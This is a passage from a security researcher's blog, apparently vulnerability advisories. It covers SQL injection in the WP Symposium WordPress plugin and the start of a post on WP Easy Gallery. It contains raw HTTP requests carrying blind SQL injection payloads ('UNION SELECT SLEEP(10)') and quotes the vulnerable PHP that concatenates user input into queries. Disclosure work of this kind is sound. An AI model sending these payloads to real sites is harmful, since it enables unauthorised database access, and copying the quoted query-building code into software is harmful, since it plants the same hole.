			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_forum_functions.php HTTP/1.0
Host: 192.168.80.130
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Cookie: wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1347997111%7Cbe07b25720d1c846b47c3dee37e9801d; 
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

action=updateEditDetails&amp;tid=1 UNION SELECT SLEEP(10)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b5112610103636-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5112610103636-2">2</div><div class="crayon-num" data-line="crayon-53c98e78b5112610103636-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5112610103636-4">4</div><div class="crayon-num" data-line="crayon-53c98e78b5112610103636-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5112610103636-6">6</div><div class="crayon-num" data-line="crayon-53c98e78b5112610103636-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5112610103636-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b5112610103636-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_forum_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5112610103636-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c98e78b5112610103636-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">WOW64</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">rv</span><span class="crayon-o">:</span><span class="crayon-cn">13.0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Gecko</span><span class="crayon-o">/</span><span class="crayon-cn">20100101</span><span class="crayon-h"> </span><span class="crayon-i">Firefox</span><span class="crayon-o">/</span><span class="crayon-cn">13.0.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5112610103636-4"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1347997111</span><span class="crayon-o">%</span><span class="crayon-cn">7Cbe07b25720d1c846b47c3dee37e9801d</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c98e78b5112610103636-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5112610103636-6"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">53</span></div><div class="crayon-line" id="crayon-53c98e78b5112610103636-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5112610103636-8"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">updateEditDetails</span><span class="crayon-o">&amp;</span><span class="crayon-v">tid</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-e">SELECT </span><span class="crayon-e">SLEEP</span><span class="crayon-sy">(</span><span class="crayon-cn">10</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0037 seconds] -->
<p><strong> Analysis of profile addFriend blind SQL injection vulnerability</strong></p>
<p>A similar lack of input validation can be seen in the /ajax/symposium_profile_functions.php file in the addFriend action handling code. It takes in an ID for a friend to add and then starts putting together some SQL like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b511c704764644" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Friend request made
if ($_POST['action'] == 'addFriend') {

	global $wpdb, $current_user;

	if (is_user_logged_in()) {

		$friend_from = $current_user-&gt;ID;
		$friend_to = $_POST['friend_to'];;					
		$friend_message = $_POST['friend_message'];

		// check that request isn't already there
		if ( $wpdb-&gt;get_var($wpdb-&gt;prepare("SELECT * FROM ".$wpdb-&gt;base_prefix."symposium_friends WHERE (friend_from = ".$friend_to." AND friend_to = ".$current_user-&gt;ID." OR friend_to = ".$friend_to." AND friend_from = ".$current_user-&gt;ID.")")) ) {
			// already exists
		} else {</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b511c704764644-1547">1547</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b511c704764644-1548">1548</div><div class="crayon-num" data-line="crayon-53c98e78b511c704764644-1549">1549</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b511c704764644-1550">1550</div><div class="crayon-num" data-line="crayon-53c98e78b511c704764644-1551">1551</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b511c704764644-1552">1552</div><div class="crayon-num" data-line="crayon-53c98e78b511c704764644-1553">1553</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b511c704764644-1554">1554</div><div class="crayon-num" data-line="crayon-53c98e78b511c704764644-1555">1555</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b511c704764644-1556">1556</div><div class="crayon-num" data-line="crayon-53c98e78b511c704764644-1557">1557</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b511c704764644-1558">1558</div><div class="crayon-num" data-line="crayon-53c98e78b511c704764644-1559">1559</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b511c704764644-1560">1560</div><div class="crayon-num" data-line="crayon-53c98e78b511c704764644-1561">1561</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b511c704764644-1547"><span class="crayon-c">// Friend request made</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b511c704764644-1548"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'addFriend'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b511c704764644-1549">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b511c704764644-1550"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b511c704764644-1551">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b511c704764644-1552"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b511c704764644-1553">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b511c704764644-1554"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$friend_from</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b511c704764644-1555"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$friend_to</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'friend_to'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b511c704764644-1556"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$friend_message</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'friend_message'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b511c704764644-1557">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b511c704764644-1558"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// check that request isn't already there</span></div><div class="crayon-line" id="crayon-53c98e78b511c704764644-1559"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_friends WHERE (friend_from = "</span><span class="crayon-sy">.</span><span class="crayon-v">$friend_to</span><span class="crayon-sy">.</span><span class="crayon-s">" AND friend_to = "</span><span class="crayon-sy">.</span><span class="crayon-v">$current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">" OR friend_to = "</span><span class="crayon-sy">.</span><span class="crayon-v">$friend_to</span><span class="crayon-sy">.</span><span class="crayon-s">" AND friend_from = "</span><span class="crayon-sy">.</span><span class="crayon-v">$current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">")"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b511c704764644-1560"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// already exists</span></div><div class="crayon-line" id="crayon-53c98e78b511c704764644-1561"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0052 seconds] -->
<p>Notice that it simply concatenates the $friend_to variable into the query. While this query is not used for output, we can still do a blind SQL injection if we&#8217;re logged in.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b5126975377789" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_profile_functions.php HTTP/1.0
Host: 192.168.80.130
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Cookie: wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1347997111%7Cbe07b25720d1c846b47c3dee37e9801d; 
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

action=addFriend&amp;friend_to=1 AND 1=2) UNION SELECT SLEEP(10), 2, 3, 4, 5, 6; --</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b5126975377789-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5126975377789-2">2</div><div class="crayon-num" data-line="crayon-53c98e78b5126975377789-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5126975377789-4">4</div><div class="crayon-num" data-line="crayon-53c98e78b5126975377789-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5126975377789-6">6</div><div class="crayon-num" data-line="crayon-53c98e78b5126975377789-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5126975377789-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b5126975377789-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_profile_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5126975377789-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c98e78b5126975377789-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">WOW64</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">rv</span><span class="crayon-o">:</span><span class="crayon-cn">13.0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Gecko</span><span class="crayon-o">/</span><span class="crayon-cn">20100101</span><span class="crayon-h"> </span><span class="crayon-i">Firefox</span><span class="crayon-o">/</span><span class="crayon-cn">13.0.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5126975377789-4"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1347997111</span><span class="crayon-o">%</span><span class="crayon-cn">7Cbe07b25720d1c846b47c3dee37e9801d</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c98e78b5126975377789-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5126975377789-6"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">76</span></div><div class="crayon-line" id="crayon-53c98e78b5126975377789-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5126975377789-8"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">addFriend</span><span class="crayon-o">&amp;</span><span class="crayon-v">friend_to</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-st">AND</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-o">=</span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-e">SELECT </span><span class="crayon-e">SLEEP</span><span class="crayon-sy">(</span><span class="crayon-cn">10</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">6</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">--</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0045 seconds] -->
<p><strong> </strong></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/sql-injection/" rel="tag">SQL Injection</a>, <a href="https://charlieeriksen.github.io/tag/symposium/" rel="tag">Symposium</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2013/02/18/wp-symposium-multiple-sql-injection/#respond" title="Comment on WP Symposium multiple SQL injection vulnerabilities">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-132 -->

				
					
<article id="post-217" class="post-217 post type-post status-publish format-standard hentry category-security">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2013/01/27/vulnerability-chaining-magic-quotes-bypass-with-hexadecimal-literals-and-data-exfiltration/" title="5:05 pm" rel="bookmark" class="entry-date"><time datetime="2013-01-27T17:05:27+00:00" pubdate>January 27, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2013/01/27/vulnerability-chaining-magic-quotes-bypass-with-hexadecimal-literals-and-data-exfiltration/" title="Permalink to Vulnerability chaining, magic quotes bypass with hexadecimal literals and data exfiltration" rel="bookmark">Vulnerability chaining, magic quotes bypass with hexadecimal literals and data exfiltration</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p>I have a pet peeve. It&#8217;s when people argue that vulnerabilities that exist in an administrator interface, though not inherently critical, does not need to be fixed. Many administrator interfaces assume that if a user has access to it, the user can be explicitly trusted. And that leaves entire applications at a risk that&#8217;s easily fixable, yet developers refuse to acknowledge this.</p>
<p>A such example is what I&#8217;m going to talk about in this blog post more in depth. I already showed an example of a similar issue over <a href="https://charlieeriksen.github.io/2012/07/25/wordpress-flexi-quote-rotator-plugin-multiple-vulnerabilities/">here</a>. But what happens when you take this sort of triple-joy attack further to its logical conclusion? First though, let’s take a look at the <a href="http://wordpress.org/extend/plugins/wp-easy-gallery/">WP Easy Gallery plugin</a>!</p>
<p><strong>SQL Injection analysis</strong><br />
I first came across this issue through some tools I coded to discover extremely obvious vulnerabilities, which exist all over. It alerted me to the fact that there was a good likelihood of a SQL injection condition existing in the <a href="http://plugins.svn.wordpress.org/wp-easy-gallery/trunk/admin/add-images.php">/admin/add-images.php</a> file. Let’s look!</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b5e8f908950154" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
//Select gallery
if(isset($_POST['select_gallery']) || isset($_POST['galleryId'])) {
$gid = (isset($_POST['select_gallery'])) ? $_POST['select_gallery'] : $_POST['galleryId'];
$imageResults = $wpdb-&gt;get_results( "SELECT * FROM $easy_gallery_image_table WHERE gid = $gid ORDER BY sortOrder ASC" );
$gallery = $wpdb-&gt;get_row( "SELECT * FROM $easy_gallery_table WHERE Id = $gid" );
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b5e8f908950154-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5e8f908950154-2">2</div><div class="crayon-num" data-line="crayon-53c98e78b5e8f908950154-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5e8f908950154-4">4</div><div class="crayon-num" data-line="crayon-53c98e78b5e8f908950154-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5e8f908950154-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b5e8f908950154-1"><span class="crayon-c">//Select gallery</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5e8f908950154-2"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'select_gallery'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'galleryId'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b5e8f908950154-3"><span class="crayon-sy">$</span><span class="crayon-v">gid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'select_gallery'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span 